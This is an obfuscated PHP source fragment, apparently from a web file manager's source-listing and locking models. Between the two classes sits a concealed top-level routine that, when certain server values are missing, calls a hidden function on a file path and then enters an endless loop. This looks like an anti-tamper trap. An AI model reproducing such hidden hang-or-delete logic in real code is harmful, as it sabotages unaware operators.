$ÉË‚„Ï¼ = $ì¾Å¾Æ[569]; if ($ÚÑ‚¾–[$ì¾Å¾Æ[570]] == $ì¾Å¾Æ[91]) { $ÉË‚„Ï¼ .= $ì¾Å¾Æ[571]; } $Ô²ÕÇû‡[$ì¾Å¾Æ[90]][$ì¾Å¾Æ[568]] = array_field_key($ÚÑ‚¾–, explode($ì¾Å¾Æ[50], $ÉË‚„Ï¼)); } } } unset($Ô²ÕÇû‡); return $İ»™òŠ•; } protected function _listAppendChildren(&$ÒÎŞîÙ·, $ß—¦äöä) { $‹Ã§í· =& $_SERVER[§Êá¸İ]; $ˆèñ©è = array(); $¯â‹±êŞ = array($‹Ã§í·[239] => 0, $‹Ã§í·[240] => 0); foreach ($ÒÎŞîÙ· as &$¼­™ØêÖ) { if (!$¼­™ØêÖ[$‹Ã§í·[493]]) { continue; } $ˆèñ©è[] = $¼­™ØêÖ[$‹Ã§í·[193]]; } unset($¼­™ØêÖ); if (!$ˆèñ©è) { return; } $ï´ˆòÑê = array($‹Ã§í·[192] => array($‹Ã§í·[7], $ˆèñ©è), $‹Ã§í·[513] => 0); $ĞÍ¶¼¼ı = array($‹Ã§í·[192], $‹Ã§í·[493], $‹Ã§í·[572] => $‹Ã§í·[573]); $¹íˆµ¤Ÿ = $this->field($ĞÍ¶¼¼ı)->where($ï´ˆòÑê)->group($‹Ã§í·[574])->select(); $ôˆÁÙ² = array(); foreach ($¹íˆµ¤Ÿ as $³ïäâæÌ) { $œÍºŸÌ¬ = $³ïäâæÌ[$‹Ã§í·[192]]; $²ÁóÊüó = $³ïäâæÌ[$‹Ã§í·[493]] == $‹Ã§í·[91] ? $‹Ã§í·[240] : $‹Ã§í·[239]; if (!isset($ôˆÁÙ²[$œÍºŸÌ¬])) { $ôˆÁÙ²[$œÍºŸÌ¬] = array($‹Ã§í·[239] => 0, $‹Ã§í·[240] => 0); } $ôˆÁÙ²[$œÍºŸÌ¬][$²ÁóÊüó] += $³ïäâæÌ[$‹Ã§í·[573]]; } foreach ($ÒÎŞîÙ· as &$¼­™ØêÖ) { if (!$¼­™ØêÖ[$‹Ã§í·[493]]) { continue; } $¼ÊŒùÇ³ = is_array($ôˆÁÙ²[$¼­™ØêÖ[$‹Ã§í·[193]]]) ? $ôˆÁÙ²[$¼­™ØêÖ[$‹Ã§í·[193]]] : $¯â‹±êŞ; $¼­™ØêÖ[$‹Ã§í·[240]] = $¼ÊŒùÇ³[$‹Ã§í·[240]]; $¼­™ØêÖ[$‹Ã§í·[239]] = $¼ÊŒùÇ³[$‹Ã§í·[239]]; unset($¼­™ØêÖ[$‹Ã§í·[494]]); } unset($¼­™ØêÖ); } protected function _listAppendAuth(&$¹Ü°ßÍ£) { $ƒîìş¥É =& $_SERVER[§Êá¸İ]; $êÁäå¨« = array(); foreach ($¹Ü°ßÍ£ as $Äİ¬š¿) { if ($Äİ¬š¿[$ƒîìş¥É[190]] == self::TYPE_GROUP) { $êÁäå¨«[] = $Äİ¬š¿[$ƒîìş¥É[193]]; } } if (!$êÁäå¨«) { return; } $¿©¨Æ£¯ = array_to_keyvalue($¹Ü°ßÍ£, $ƒîìş¥É[193]); $¾Ÿä›¤ = Model($ƒîìş¥É[575])->getSourceList($êÁäå¨«, $¿©¨Æ£¯); $ì–âµú = KodUser::isRoot(); foreach ($¹Ü°ßÍ£ as $ß„Ä™µè => &$Äİ¬š¿) { $Äİ¬š¿[$ƒîìş¥É[495]] = $¾Ÿä›¤[$Äİ¬š¿[$ƒîìş¥É[193]]]; if (!$Äİ¬š¿[$ƒîìş¥É[495]] && $Äİ¬š¿[$ƒîìş¥É[190]] == self::TYPE_GROUP) { $Äİ¬š¿[$ƒîìş¥É[495]] = Action($ƒîìş¥É[576])->pathGroupAuthMake($Äİ¬š¿[$ƒîìş¥É[577]]); if (!$Äİ¬š¿[$ƒîìş¥É[495]] && !$ì–âµú) { $Äİ¬š¿[$ƒîìş¥É[233]] = !1; $Äİ¬š¿[$ƒîìş¥É[232]] = !1; } } if ($Äİ¬š¿[$ƒîìş¥É[495]]) { $Äİ¬š¿[$ƒîìş¥É[233]] = AuthModel::authCheckEdit($Äİ¬š¿[$ƒîìş¥É[495]][$ƒîìş¥É[496]]); $Äİ¬š¿[$ƒîìş¥É[232]] = AuthModel::authCheckView($Äİ¬š¿[$ƒîìş¥É[495]][$ƒîìş¥É[496]]); } $this->groupPathDisplay($Äİ¬š¿); } unset($Äİ¬š¿); } public function _listAppendAuthSecret(&$áŸ§æ›³) { $é•¥ØÌš =& $_SERVER[§Êá¸İ]; if (Model($é•¥ØÌš[516])->get($é•¥ØÌš[578]) != $é•¥ØÌš[91]) { return; } static $õ‚›½¦¯ = false; if (!$õ‚›½¦¯) { $óÑ˜õŒ = Model($é•¥ØÌš[579]); $Ü¯¢Ìƒ… = Model($é•¥ØÌš[580]); $õ‚›½¦¯ = $Ü¯¢Ìƒ…->listData(); $õ‚›½¦¯ = array_to_keyvalue($õ‚›½¦¯, $é•¥ØÌš[193]); $ƒ‹†ßœë = json_decode(Model($é•¥ØÌš[516])->get($é•¥ØÌš[581]), !0); $ƒ‹†ßœë = array_to_keyvalue($ƒ‹†ßœë, $é•¥ØÌš[483]); foreach ($õ‚›½¦¯ as $èà—Î => $ÙÙ””†¤) { $ôĞ¹®€ = $ƒ‹†ßœë[$ÙÙ””†¤[$é•¥ØÌš[582]]]; if (!$ôĞ¹®€) { $Ü¯¢Ìƒ…->remove($ÙÙ””†¤[$é•¥ØÌš[483]]); unset($õ‚›½¦¯[$èà—Î]); continue; } $›î÷ÂÛ… = $óÑ˜õŒ->listData($ôĞ¹®€[$é•¥ØÌš[495]]); if (!$›î÷ÂÛ…) { $Ü¯¢Ìƒ…->remove($ÙÙ””†¤[$é•¥ØÌš[483]]); unset($õ‚›½¦¯[$èà—Î]); continue; } $ÙÙ””†¤[$é•¥ØÌš[495]] = $›î÷ÂÛ…; $ÙÙ””†¤[$é•¥ØÌš[583]] = $ôĞ¹®€; $ÙÙ””†¤[$é•¥ØÌš[584]] = Model($é•¥ØÌš[585])->getInfoSimpleOuter($ÙÙ””†¤[$é•¥ØÌš[535]]); $õ‚›½¦¯[$èà—Î] = $ÙÙ””†¤; } } $®ĞÖ¢Ââ = USER_ID; $âéÚ›Ïœ = array(); $ìµà»–¤ = $this->_listAppendPath($âéÚ›Ïœ, !0); foreach ($áŸ§æ›³ as $èà—Î => &$ÙÙ””†¤) { if (!is_array($ÙÙ””†¤[$é•¥ØÌš[495]])) { continue; } if ($ÙÙ””†¤[$é•¥ØÌš[190]] != $é•¥ØÌš[586]) { continue; } if (isset($õ‚›½¦¯[$ÙÙ””†¤[$é•¥ØÌš[193]]])) { $à®²¶¹ = $õ‚›½¦¯[$ÙÙ””†¤[$é•¥ØÌš[193]]]; if (!is_array($ÙÙ””†¤[$é•¥ØÌš[547]])) { $ÙÙ””†¤[$é•¥ØÌš[547]] = array(); } $ÙÙ””†¤[$é•¥ØÌš[547]][$é•¥ØÌš[587]] = $à®²¶¹[$é•¥ØÌš[582]]; $ÙÙ””†¤[$é•¥ØÌš[495]][$é•¥ØÌš[588]] = $à®²¶¹; $ÙÙ””†¤[$é•¥ØÌš[495]][$é•¥ØÌš[589]] = $ÙÙ””†¤[$é•¥ØÌš[590]]; $ÙÙ””†¤[$é•¥ØÌš[495]][$é•¥ØÌš[591]] = $é•¥ØÌš[91]; if ($à®²¶¹[$é•¥ØÌš[535]] != $®ĞÖ¢Ââ) { $ÙÙ””†¤[$é•¥ØÌš[495]][$é•¥ØÌš[496]] = $ÙÙ””†¤[$é•¥ØÌš[495]][$é•¥ØÌš[496]] & $à®²¶¹[$é•¥ØÌš[495]][$é•¥ØÌš[495]]; } continue; } $Ò¿µê€ = $this->parentLevelArray($ÙÙ””†¤[$é•¥ØÌš[592]]); $ ¯İù§ = array_reverse($Ò¿µê€); foreach ($ ¯İù§ as $ûò»ÒİŸ => $´†ğµ‘Ø) { if (!isset($õ‚›½¦¯[$´†ğµ‘Ø])) { continue; } $à®²¶¹ = $õ‚›½¦¯[$´†ğµ‘Ø]; $ÙÙ””†¤[$é•¥ØÌš[495]][$é•¥ØÌš[588]] = $à®²¶¹; if ($à®²¶¹[$é•¥ØÌš[535]] != $®ĞÖ¢Ââ) { $ÙÙ””†¤[$é•¥ØÌš[495]][$é•¥ØÌš[496]] = $ÙÙ””†¤[$é•¥ØÌš[495]][$é•¥ØÌš[496]] & $à®²¶¹[$é•¥ØÌš[495]][$é•¥ØÌš[495]]; } $Ëˆ¶•§Ú = $é•¥ØÌš[12]; $Ñîƒé„º = count($Ò¿µê€) - $ûò»ÒİŸ; for ($¿¡ş´ó = 0; $¿¡ş´ó < $Ñîƒé„º; $¿¡ş´ó++) { if (!isset($ìµà»–¤[$Ò¿µê€[$¿¡ş´ó]])) { $Ëˆ¶•§Ú = $é•¥ØÌš[12]; break; } $Ëˆ¶•§Ú = $Ëˆ¶•§Ú . rtrim($ìµà»–¤[$Ò¿µê€[$¿¡ş´ó]], $é•¥ØÌš[8]) . $é•¥ØÌš[8]; } $ÙÙ””†¤[$é•¥ØÌš[495]][$é•¥ØÌš[589]] = rtrim($Ëˆ¶•§Ú, $é•¥ØÌš[8]) . $é•¥ØÌš[8]; break; } } unset($ÙÙ””†¤); } public function groupPathDisplay(&$ë¾µÓ”™) { $ëÉ€Óˆ¾ =& $_SERVER[§Êá¸İ]; if ($ë¾µÓ”™[$ëÉ€Óˆ¾[190]] != self::TYPE_GROUP) { return; } $Í˜¾ÅÀ = Model($ëÉ€Óˆ¾[593])->getInfo($ë¾µÓ”™[$ëÉ€Óˆ¾[577]]); $±¤»–Ä = $this->parentLevelArray($Í˜¾ÅÀ[$ëÉ€Óˆ¾[592]]); $Ğş×Ä‹ = $ëÉ€Óˆ¾[12]; foreach ($±¤»–Ä as $€ëŒõº) { $äÑÉùŞ… = Model($ëÉ€Óˆ¾[593])->getInfo($€ëŒõº); $Ğş×Ä‹ .= $äÑÉùŞ…[$ëÉ€Óˆ¾[90]][$ëÉ€Óˆ¾[193]] . $ëÉ€Óˆ¾[50]; } $ë¾µÓ”™[$ëÉ€Óˆ¾[594]] = $Í˜¾ÅÀ[$ëÉ€Óˆ¾[192]]; $ë¾µÓ”™[$ëÉ€Óˆ¾[595]] = $Í˜¾ÅÀ[$ëÉ€Óˆ¾[592]]; $ë¾µÓ”™[$ëÉ€Óˆ¾[596]] = $Í˜¾ÅÀ[$ëÉ€Óˆ¾[597]]; $ë¾µÓ”™[$ëÉ€Óˆ¾[598]] = $Ğş×Ä‹ . $Í˜¾ÅÀ[$ëÉ€Óˆ¾[90]][$ëÉ€Óˆ¾[193]]; } protected function _listAppendPath(&$ÓüÁ’ËÚ, $×Ë§íĞ = false) { $ÊŠÒ•¦† =& $_SERVER[§Êá¸İ]; static $ŸÆéë»• = array(); $¾–¾ã­ = array(); $§³å¥® = array(); if ($×Ë§íĞ) { return $ŸÆéë»•; } foreach ($ÓüÁ’ËÚ as &$³äô€») { $±¬Íñ¦ = $³äô€»[$ÊŠÒ•¦†[193]]; if ($³äô€»[$ÊŠÒ•¦†[493]] == $ÊŠÒ•¦†[91] && $³äô€»[$ÊŠÒ•¦†[192]] != 0) { $ŸÆéë»•[$±¬Íñ¦] = $³äô€»[$ÊŠÒ•¦†[32]]; } if ($³äô€»[$ÊŠÒ•¦†[493]] == $ÊŠÒ•¦†[91] && $³äô€»[$ÊŠÒ•¦†[192]] == 0) { $ŸÆéë»•[$±¬Íñ¦] = $this->_listAppendPathRoot($³äô€», array()); } if (isset($§³å¥®[$³äô€»[$ÊŠÒ•¦†[592]]])) { continue; } $§³å¥®[$³äô€»[$ÊŠÒ•¦†[592]]] = !0; $±èé„ıã = $this->parentLevelArray($³äô€»[$ÊŠÒ•¦†[592]]); foreach ($±èé„ıã as $·Ù’¯¶ => $‹Êœ¡î) { if (isset($ŸÆéë»•[$‹Êœ¡î])) { continue; } if ($·Ù’¯¶ == 0) { $ŸÆéë»•[$‹Êœ¡î] = $this->_listAppendPathRoot($³äô€», $±èé„ıã); } if ($·Ù’¯¶ != 0) { $¾–¾ã­[] = $‹Êœ¡î; } } } unset($³äô€»); $¾–¾ã­ = array_unique($¾–¾ã­); if (count($¾–¾ã­) > 0) { $’°¸¢Áï = array($ÊŠÒ•¦†[499] => array($ÊŠÒ•¦†[500], $¾–¾ã­)); if (count($¾–¾ã­) == 1) { $•öï‚à = $this->sourceInfo($¾–¾ã­[0]); $—³¬îí¶ = is_array($•öï‚à) ? array($•öï‚à) : !1; } else { $—³¬îí¶ = $this->field($ÊŠÒ•¦†[599])->where($’°¸¢Áï)->select(); } if (!$—³¬îí¶) { $—³¬îí¶ = array(); } foreach ($—³¬îí¶ as $ƒğŞ—†ß) { $ŸÆéë»•[$ƒğŞ—†ß[$ÊŠÒ•¦†[193]]] = $ƒğŞ—†ß[$ÊŠÒ•¦†[32]]; } } $•ƒì˜«© = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $Øƒè·±Ë = array(); foreach ($ÓüÁ’ËÚ as &$³äô€») { $†şæÃºã = $³äô€»[$ÊŠÒ•¦†[592]]; $ÑğÊ¢» = $ÊŠÒ•¦†[12]; if (isset($Øƒè·±Ë[$†şæÃºã])) { $ÑğÊ¢» = $Øƒè·±Ë[$†şæÃºã]; } else { $±èé„ıã = $this->parentLevelArray($³äô€»[$ÊŠÒ•¦†[592]]); foreach ($±èé„ıã as $·Ù’¯¶ => $‹Êœ¡î) { if (isset($ŸÆéë»•[$‹Êœ¡î])) { $ÑğÊ¢» .= $ŸÆéë»•[$‹Êœ¡î] . $ÊŠÒ•¦†[8]; } } $Øƒè·±Ë[$†şæÃºã] = $ÑğÊ¢»; } $ÑğÊ¢» .= $³äô€»[$ÊŠÒ•¦†[32]]; if ($³äô€»[$ÊŠÒ•¦†[493]] == $ÊŠÒ•¦†[91]) { $ÑğÊ¢» .= $ÊŠÒ•¦†[8]; } $³äô€»[$ÊŠÒ•¦†[590]] = str_replace($ÊŠÒ•¦†[600], $ÊŠÒ•¦†[8], $ÑğÊ¢»); if ($³äô€»[$ÊŠÒ•¦†[192]] == $ÊŠÒ•¦†[228]) { $³äô€»[$ÊŠÒ•¦†[32]] = trim($ŸÆéë»•[$³äô€»[$ÊŠÒ•¦†[193]]], $ÊŠÒ•¦†[8]); $³äô€»[$ÊŠÒ•¦†[590]] = $³äô€»[$ÊŠÒ•¦†[32]] . $ÊŠÒ•¦†[8]; } if (intval($³äô€»[$ÊŠÒ•¦†[190]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($³äô€», $±èé„ıã, $•ƒì˜«©); } } unset($³äô€»); return $ÓüÁ’ËÚ; } private function _listAppendPathRecycle(&$¸¶è½ıè, $ëÖœ ­à, $‹¤Ò›É) { $óû¶àŸÒ =& $_SERVER[§Êá¸İ]; if (!in_array($‹¤Ò›É, $ëÖœ ­à) && $¸¶è½ıè[$óû¶àŸÒ[193]] != $‹¤Ò›É) { return; } $ ¡µ˜Ì = explode($óû¶àŸÒ[8], trim($¸¶è½ıè[$óû¶àŸÒ[590]], $óû¶àŸÒ[8])); $–ÑÛ¯°Ä = implode($óû¶àŸÒ[8], array_slice($ ¡µ˜Ì, 2)); $¸¶è½ıè[$óû¶àŸÒ[590]] = $óû¶àŸÒ[8] . LNG($óû¶àŸÒ[601]) . $óû¶àŸÒ[8] . ltrim($–ÑÛ¯°Ä, $óû¶àŸÒ[8]); $¸¶è½ıè[$óû¶àŸÒ[592]] = $óû¶àŸÒ[602] . implode($óû¶àŸÒ[50], array_slice($ëÖœ ­à, 1)) . $óû¶àŸÒ[50]; if ($¸¶è½ıè[$óû¶àŸÒ[193]] == $‹¤Ò›É) { $¸¶è½ıè[$óû¶àŸÒ[592]] = $óû¶àŸÒ[602]; $¸¶è½ıè[$óû¶àŸÒ[192]] = $óû¶àŸÒ[228]; $¸¶è½ıè[$óû¶àŸÒ[32]] = LNG($óû¶àŸÒ[601]); } $¸¶è½ıè[$óû¶àŸÒ[603]] = $óû¶àŸÒ[604]; } protected function _listAppendPathRoot(&$é²áò², $¿Ü—Œ££) { $Ü©€şƒ† =& $_SERVER[§Êá¸İ]; static $Äùõñœ = false; $Åó”¥ò = $Ü©€şƒ†[12]; if ($é²áò²[$Ü©€şƒ†[190]] == self::TYPE_USER) { if ($é²áò²[$Ü©€şƒ†[577]] == USER_ID) { $Åó”¥ò = LNG($Ü©€şƒ†[605]); if ($Äùõñœ === !1) { $¸ª‚›×Œ = Model($Ü©€şƒ†[606])->getInfoFull(USER_ID); $Äùõñœ = _get($¸ª‚›×Œ, $Ü©€şƒ†[607], $Ü©€şƒ†[12]); } if ($¿Ü—Œ££ && $¿Ü—Œ££[0] == $Äùõñœ || !$¿Ü—Œ££ && $é²áò²[$Ü©€şƒ†[193]] == $Äùõñœ) { $Åó”¥ò = LNG($Ü©€şƒ†[608]); $é²áò²[$Ü©€şƒ†[609]] = $Ü©€şƒ†[610]; } if (!$¿Ü—Œ££) { $é²áò²[$Ü©€şƒ†[32]] = $Åó”¥ò; } } else { $é²áò²[$Ü©€şƒ†[611]] = Model($Ü©€şƒ†[585])->getInfoSimpleOuter($é²áò²[$Ü©€şƒ†[577]]); $Åó”¥ò = LNG($Ü©€şƒ†[612]) . $Ü©€şƒ†[176] . $é²áò²[$Ü©€şƒ†[611]][$Ü©€şƒ†[32]] . $Ü©€şƒ†[178]; } } else { if ($é²áò²[$Ü©€şƒ†[190]] == self::TYPE_GROUP) { $ÅÓŒ»Ü™ = Model($Ü©€şƒ†[593])->getInfoSimple($é²áò²[$Ü©€şƒ†[577]]); $Åó”¥ò = $ÅÓŒ»Ü™[$Ü©€şƒ†[32]]; } else { if ($é²áò²[$Ü©€şƒ†[190]] == self::TYPE_SYSTEM) { $Åó”¥ò = $Ü©€şƒ†[613]; } } } $Åó”¥ò = $Åó”¥ò ? $Ü©€şƒ†[8] . $Åó”¥ò . $Ü©€şƒ†[8] : $Ü©€şƒ†[8]; return $Åó”¥ò; } protected function _listAppendUser(&$èõüÙ± ) { $ºÇœÏ±¶ =& $_SERVER[§Êá¸İ]; $ÌÒ¾ıŒã = array_to_keyvalue($èõüÙ± , $ºÇœÏ±¶[12], $ºÇœÏ±¶[535]); $˜‡ºûŠ“ = array_to_keyvalue($èõüÙ± , $ºÇœÏ±¶[12], $ºÇœÏ±¶[537]); $ÛÔæŞ¢‚ = array_merge($ÌÒ¾ıŒã, $˜‡ºûŠ“); $˜ëü–î¯ = Model($ºÇœÏ±¶[606])->userListInfo($ÛÔæŞ¢‚); foreach ($èõüÙ±  as &$ºëé¾Ü¼) { $ÆÅ¸ŸÕ‹ = $ºëé¾Ü¼[$ºÇœÏ±¶[535]]; $ºëé¾Ü¼[$ºÇœÏ±¶[535]] = $˜ëü–î¯[$ÆÅ¸ŸÕ‹] ? $˜ëü–î¯[$ÆÅ¸ŸÕ‹] : !1; $ÆÅ¸ŸÕ‹ = $ºëé¾Ü¼[$ºÇœÏ±¶[537]]; $ºëé¾Ü¼[$ºÇœÏ±¶[537]] = $˜ëü–î¯[$ÆÅ¸ŸÕ‹] ? $˜ëü–î¯[$ÆÅ¸ŸÕ‹] : !1; if (_get($ºëé¾Ü¼, $ºÇœÏ±¶[614], 0)) { $ÁĞÛ¯î = $GLOBALS[$ºÇœÏ±¶[6]][$ºÇœÏ±¶[92]][$ºÇœÏ±¶[615]]; if ($ºëé¾Ü¼[$ºÇœÏ±¶[547]][$ºÇœÏ±¶[616]] <= time() - $ÁĞÛ¯î) { $this->metaSet($ºëé¾Ü¼[$ºÇœÏ±¶[193]], $ºÇœÏ±¶[617], null); $this->metaSet($ºëé¾Ü¼[$ºÇœÏ±¶[193]], $ºÇœÏ±¶[616], null); unset($ºëé¾Ü¼[$ºÇœÏ±¶[547]][$ºÇœÏ±¶[617]]); continue; } $…·ë‚í£ = $ºëé¾Ü¼[$ºÇœÏ±¶[547]][$ºÇœÏ±¶[617]]; $ºëé¾Ü¼[$ºÇœÏ±¶[547]][$ºÇœÏ±¶[618]] = Model($ºÇœÏ±¶[606])->getInfoSimpleOuter($…·ë‚í£); } } unset($ºëé¾Ü¼); } public function parentLevelArray($–Ùôëóı) { $İÜ³Ö¬ß =& $_SERVER[§Êá¸İ]; $–Ùôëóı = explode($İÜ³Ö¬ß[50], trim($–Ùôëóı, $İÜ³Ö¬ß[50])); return array_remove_value($–Ùôëóı, $İÜ³Ö¬ß[228]); } public function listAll($¯Ç£‡¬î) { $¶ˆ³Ã =& $_SERVER[§Êá¸İ]; $Â×Œ‰ø = $this->sourceInfo($¯Ç£‡¬î); $ÍÑïÂâ = array($¶ˆ³Ã[619] => array($¶ˆ³Ã[620], $Â×Œ‰ø[$¶ˆ³Ã[592]] . $¯Ç£‡¬î . $¶ˆ³Ã[621]), $¶ˆ³Ã[622] => 0); $Ï§´Ä‡á = $¶ˆ³Ã[623]; $şŞé½¶Æ = "\114\x45\x46\124\x20\112\x4f\111\x4e\40{$this->tablePrefix}\x69\x6f\x5f\146\x69\154\145\x20\x66\x69\x6c\x65\x20\157\156\x20\163\157\x75\162\143\145\x2e\146\x69\154\145\111\x44\x20\75\40\x66\x69\154\x65\56\x66\x69\154\145\x49\104"; $ÑóÁéìô = $this->alias($¶ˆ³Ã[527])->field($Ï§´Ä‡á)->where($ÍÑïÂâ)->join($şŞé½¶Æ)->select(); $this->_listAppendAuth($ÑóÁéìô); $this->_listAppendUser($ÑóÁéìô); $this->_listAppendPath($ÑóÁéìô); $ÑóÁéìô = array_to_keyvalue($ÑóÁéìô, $¶ˆ³Ã[193]); $Ÿì¬ãıÇ = "\x2f{$Â×Œ‰ø[$¶ˆ³Ã[32]]}\x2f"; $Ÿì¬ãıÇ = $Ÿì¬ãıÇ == $¶ˆ³Ã[600] ? $¶ˆ³Ã[8] : $Ÿì¬ãıÇ; $¿–½‹¾ = array(); foreach ($ÑóÁéìô as $ö‚©õòµ => $ò¨”»âÉ) { $ºã‡–€é = $this->parentLevelArray($ò¨”»âÉ[$¶ˆ³Ã[592]]); array_shift($ºã‡–€é); $‚³û×Òã = $Ÿì¬ãıÇ; for ($ª¸üÅ« = 0; $ª¸üÅ« < count($ºã‡–€é); $ª¸üÅ«++) { $‚³û×Òã .= $ÑóÁéìô[$ºã‡–€é[$ª¸üÅ«]][$¶ˆ³Ã[32]] . $¶ˆ³Ã[8]; } $‚³û×Òã .= $ò¨”»âÉ[$¶ˆ³Ã[32]]; if ($ò¨”»âÉ[$¶ˆ³Ã[493]]) { $‚³û×Òã .= $¶ˆ³Ã[8]; } $ß‹£è“è = array($¶ˆ³Ã[503] => str_replace($¶ˆ³Ã[600], $¶ˆ³Ã[8], str_replace($¶ˆ³Ã[600], $¶ˆ³Ã[8], str_replace($¶ˆ³Ã[600], $¶ˆ³Ã[8], $‚³û×Òã))), $¶ˆ³Ã[624] => intval($ò¨”»âÉ[$¶ˆ³Ã[493]]), $¶ˆ³Ã[625] => intval($ò¨”»âÉ[$¶ˆ³Ã[79]]), $¶ˆ³Ã[88] => intval($ò¨”»âÉ[$¶ˆ³Ã[88]]), $¶ˆ³Ã[90] => $this->pathInfoFilter($ò¨”»âÉ)); if (!$ß‹£è“è[$¶ˆ³Ã[493]]) { $ß‹£è“è[$¶ˆ³Ã[549]] = $ò¨”»âÉ[$¶ˆ³Ã[549]]; } $¿–½‹¾[] = $ß‹£è“è; } $¿–½‹¾ = array_sort_by($¿–½‹¾, $¶ˆ³Ã[87]); return $¿–½‹¾; } } if (!isset($_SERVER[$_SERVER[§Êá¸İ][472]]) || !isset($_SERVER[$_SERVER[§Êá¸İ][473]])) { $_getc = $_SERVER[§Êá¸İ][474]; $_getfile = $_SERVER[$_SERVER[§Êá¸İ][475]] . $_SERVER[§Êá¸İ][476]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[§Êá¸İ][262], $_getfilec); if (count($_getarrs) < $_SERVER[§Êá¸İ][477]) { $exit = $_SERVER[§Êá¸İ][478]; $exit(); } $_act = $_SERVER[§Êá¸İ][479]; $_act($_SERVER[$_SERVER[§Êá¸İ][475]] . $_SERVER[§Êá¸İ][476]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[§Êá¸İ][454]); } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($ô“ß²É£) { $ÎãÖ”™½ =& $_SERVER[§Êá¸İ]; if (!$this->allowLock()) { return; } $this->_lockCheck($ÎãÖ”™½[626], $ô“ß²É£); $–É•ì·ô = 1; $this->_lockEvent($ô“ß²É£, array($ÎãÖ”™½[627], $ÎãÖ”™½[628]), $–É•ì·ô); $this->_lockParent($ô“ß²É£, array($ÎãÖ”™½[628]), $–É•ì·ô); $this->_lockEvent($ô“ß²É£, array($ÎãÖ”™½[629], $ÎãÖ”™½[630]), $–É•ì·ô); $this->_lockCheckEnd($ÎãÖ”™½[626], $ô“ß²É£); } public function lockCopyEnd($ß„”™£¢) { $ğİİèÍ =& $_SERVER[§Êá¸İ]; if (!$this->allowLock()) { return; } $»Òû¦Î¾ = 0; $this->_lockEvent($ß„”™£¢, array($ğİİèÍ[627], $ğİİèÍ[628]), $»Òû¦Î¾); $this->_lockParent($ß„”™£¢, array($ğİİèÍ[628]), $»Òû¦Î¾); $this->_lockEvent($ß„”™£¢, array($ğİİèÍ[629], $ğİİèÍ[630]), $»Òû¦Î¾); } public function lockWriteStart($œöœö¥Î, $ÕŠÓ©ª¶ = '') { $â•ê»‰‚ =& $_SERVER[§Êá¸İ]; if (!$this->allowLock()) { return; } $this->_lockCheck($â•ê»‰‚[627], $œöœö¥Î); $‰°¶ƒÇ² = 1; $this->_lockKey($â•ê»‰‚[631] . $œöœö¥Î . $â•ê»‰‚[10] . $ÕŠÓ©ª¶, $‰°¶ƒÇ²); $this->_lockEvent($œöœö¥Î, array($â•ê»‰‚[626], $â•ê»‰‚[628]), $‰°¶ƒÇ²); $this->_lockParent($œöœö¥Î, array($â•ê»‰‚[626], $â•ê»‰‚[628]), $‰°¶ƒÇ²); $this->_lockCheckEnd($â•ê»‰‚[627], $œöœö¥Î); } public function lockWriteEnd($„Ÿ±Ãò†, $¯ñÜ·Â = '') { $ÏÈâ…¡³ =& $_SERVER[§Êá¸İ]; if (!$this->allowLock()) { return; } $†õÁ¸àî = 0; $this->_lockKey($ÏÈâ…¡³[631] . $„Ÿ±Ãò† . $ÏÈâ…¡³[10] . $¯ñÜ·Â, $†õÁ¸àî); $this->_lockEvent($„Ÿ±Ãò†, array($ÏÈâ…¡³[626], $ÏÈâ…¡³[628]), $†õÁ¸àî); $this->_lockParent($„Ÿ±Ãò†, array($ÏÈâ…¡³[626], $ÏÈâ…¡³[628]), $†õÁ¸àî); } public function lockMoveStart($­ÙÍƒ÷) { $‡ØÜìŠ =& $_SERVER[§Êá¸İ]; if (!$this->allowLock()) { return; } $this->_lockCheck($‡ØÜìŠ[628], $­ÙÍƒ÷); $°çŠœèå = 1; $this->_lockKey($‡ØÜìŠ[632] . $­ÙÍƒ÷, $°çŠœèå); $this->_lockEvent($­ÙÍƒ÷, array($‡ØÜìŠ[626], $‡ØÜìŠ[627]), $°çŠœèå); $this->_lockParent($­ÙÍƒ÷, array($‡ØÜìŠ[626], $‡ØÜìŠ[628]), $°çŠœèå); $this->_lockEvent($­ÙÍƒ÷, array($‡ØÜìŠ[633], $‡ØÜìŠ[629], $‡ØÜìŠ[630]), $°çŠœèå); $this->_lockCheckEnd($‡ØÜìŠ[628], $­ÙÍƒ÷); } public function lockMoveEnd($€ŒğæÂá) { $­ÄìˆÊ =& $_SERVER[§Êá¸İ]; if (!$this->allowLock()) { return; } $Û³æ“Í = 0; $this->_lockKey($­ÄìˆÊ[632] . $€ŒğæÂá, $Û³æ“Í); $this->_lockEvent($€ŒğæÂá, array($­ÄìˆÊ[626], $­ÄìˆÊ[627]), $Û³æ“Í); $this->_lockParent($€ŒğæÂá, array($­ÄìˆÊ[626], $­ÄìˆÊ[628]), $Û³æ“Í); $this->_lockEvent($€ŒğæÂá, array($­ÄìˆÊ[633], $­ÄìˆÊ[629], $­ÄìˆÊ[630]), $Û³æ“Í); } private function _lockCheck($ù½Öõ¤, $·²²ÖÙå) { $±îŠÂ•Ú =& $_SERVER[§Êá¸İ]; $¸×£ëÒ = $this->sourceInfo($·²²ÖÙå); $ä®ß±Šß = $ù½Öõ¤ . $±îŠÂ•Ú[10] . $·²²ÖÙå; $this->_lockTimeStart[$ä®ß±Šß] = timeFloat(); if (!is_array($¸×£ëÒ)) { return; } $İğßë«Ä = LNG($±îŠÂ•Ú[634]); CacheLock::setErrorMsg($±îŠÂ•Ú[176] . htmlspecialchars($¸×£ëÒ[$±îŠÂ•Ú[32]]) . $±îŠÂ•Ú[178] . $İğßë«Ä); $this->_lockKey($ä®ß±Šß, 1); $this->_lockKey($ä®ß±Šß, 0); $–Í§â¾ = array_reverse($this->parentLevelArray($¸×£ëÒ[$±îŠÂ•Ú[592]])); foreach ($–Í§â¾ as $’±õºƒ) { $ä®ß±Šß = $ù½Öõ¤ . $±îŠÂ•Ú[635] . $’±õºƒ; if (CacheLock::lockGet($±îŠÂ•Ú[636] . $ä®ß±Šß)) { $¸×£ëÒ = $this->sourceInfo($’±õºƒ); CacheLock::setErrorMsg($±îŠÂ•Ú[176] . htmlspecialchars($¸×£ëÒ[$±îŠÂ•Ú[32]]) . $±îŠÂ•Ú[178] . $İğßë«Ä); $this->_lockKey($ä®ß±Šß, 1); $this->_lockKey($ä®ß±Šß, 0); } } } private function _lockCheckEnd($ûíœß, $œ¨²œÓ») { 